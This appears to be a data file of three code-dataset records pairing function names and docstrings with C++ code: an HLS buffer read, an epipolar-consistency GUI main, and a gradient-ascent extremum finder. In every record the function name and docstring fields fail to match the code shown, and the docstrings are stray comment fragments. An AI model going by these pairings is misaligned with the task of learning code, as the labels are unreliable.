{"content":"{'function_name': 'denoiseb_rd10_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd11_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd11 read pattern: { denoiseb_update_0[d0, d1] -> raw[2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2896 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_2896();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":5238}
{"content":"{'function_name': 'gui', 'docstring': '\/\/ Write ini-File', 'code': 'int main(int argc, char ** argv)\\n{\\n\\t\/\/ Define default settings\\n\\tGetSetGui::File   (\"Epipolar Consistency\/Images\/Image 0\"           ).setExtensions(\"2D NRRD image (*.nrrd);All Files (*)\");\\n\\tGetSetGui::File   (\"Epipolar Consistency\/Images\/Image 1\"           ).setExtensions(\"2D NRRD image (*.nrrd);All Files (*)\");\\n\\tGetSet<double>    (\"Epipolar Consistency\/Images\/Pixel Spacing\"     )=.308;\\n\\tGetSetGui::Section(\"Epipolar Consistency\/Images\"                   ).setGrouped();\\n\\tGetSet<double>    (\"Epipolar Consistency\/Sampling\/Angle Step (deg)\")=0.01;\\n\\n\\tEpipolarConsistency::RadonIntermediateFunction().gui_declare_section(\"Epipolar Consistency\/Radon Intermediate\");\\n\\tGetSetGui::Button(\"Epipolar Consistency\/Update\")=\"Update...\";\\n\\n\\t\/\/ Run application\\n\\tg_app.init(argc,argv,gui);\\n\\tg_app.window().addMenuItem(\"File\",\"Show Plot Editor...\");\\n\\tg_app.window().addMenuItem(\"File\"),\\n\\tg_app.window().addDefaultFileMenu();\\n\\tg_app.window().aboutText()=\\n\\t\\t\"<h4>Visualization of Epipolar Consistency and Fan-Beam Consistency.<\/h4>\\\\n\\\\n\"\\n\\t\\t\"Copyright 2014-2018 by <a href=\\\\\"mailto:aaichert@gmail.com?Subject=[Epipolar Consistency]\\\\\">Andre Aichert<\/a> <br>\"\\n\\t\\t\"<h4>Epipolar Consistency:<\/h4>\\\\n\\\\n\"\\n\\t\\t\"Any two ideal transmission images with perfectly known projection geometry contain redundant information. \"\\n\\t\\t\"Inconsistencies, i.e., motion, truncation, scatter radiation or beam-hardening can be observed using Epipolar Consistency. \"\\n\\t\\t\"<br>\"\\n\\t\\t\"<br>\"\\n\\t\\t\"See also: \"\\n\\t\\t\"<br>\"\\n\\t\\t\"<a href=\\\\\"https:\/\/www5.cs.fau.de\/research\/software\/epipolar-consistency\/\\\\\">Pattern Recognition Lab at Friedrich-Alexander University of Erlangen-Nuremberg<\/a> \"\\n\\t\\t\"<br>\"\\n\\t\\t\"<h4>Licensed under the Apache License, Version 2.0 (the \\\\\"License\\\\\")<\/h4>\\\\n\\\\n\"\\n\\t\\t\"You may not use this file except in compliance with the License. You may obtain a copy of the License at \"\\n\\t\\t\"<a href=\\\\\"http:\/\/www.apache.org\/licenses\/LICENSE-2.0\\\\\">http:\/\/www.apache.org\/licenses\/LICENSE-2.0<\/a><br>\"\\n\\t\\t;\\n\\treturn g_app.exec();\\n}'}","id":5242}
{"content":"{'function_name': 'findZeroOnLine', 'docstring': '\/\/ calling the one that varies z (might be x or y)', 'code': 'bool findExtremum(bool findMax, FunctionPtr fxn, FunctionPtr grad, MeshPtr mesh, double &value, double &x, double &y,\\n                  double x0 = 0.5, double y0 = 0.5)\\n{\\n  double xyPointTol = 1e-8; \/\/ convergence criterion (euclidean distance)\\n  x = x0; \/\/ initial guess\\n  y = y0;\\n  double dx, dy;\\n\\n  double parity = findMax ? 1.0 : -1.0; \/\/ ascent vs. descent\\n\\n  double l2incr = 1.0;\\n  double gamma = 1.0; \/\/ unsure what gamma should be\u2026\\n  int iterCount = 0;\\n  while (l2incr > xyPointTol)\\n  {\\n    value = Function::evaluate(fxn, x, y);\\n    dx = Function::evaluate(grad->x(), x, y);\\n    dy = Function::evaluate(grad->y(), x, y);\\n\\n    gamma = sqrt( abs(dx * dy) ); \/\/ geometric mean of the gradient components.  No idea if this is reasonable...\\n\\n    double x_incr = parity * gamma * dx;\\n    double y_incr = parity * gamma * dy;\\n\\n    x = x + x_incr;\\n    y = y + y_incr;\\n\\n    if ((x < 0) || (x > 1) || (y < 0) || (y > 1))\\n    {\\n      cout << \"ERROR: findExtremum diverged (left the mesh).\\\\n\";\\n      return false;\\n    }\\n\\n\/\/    cout << \"(x,y) = (\" << x << \", \" << y << \")\\\\n\";\\n\\n    iterCount++;\\n    l2incr = sqrt( x_incr * x_incr + y_incr * y_incr );\\n  }\\n  cout << \"gradient descent\/ascent took \" << iterCount << \" iterations.\\\\n\";\\n  return true;\\n}'}","id":5243}
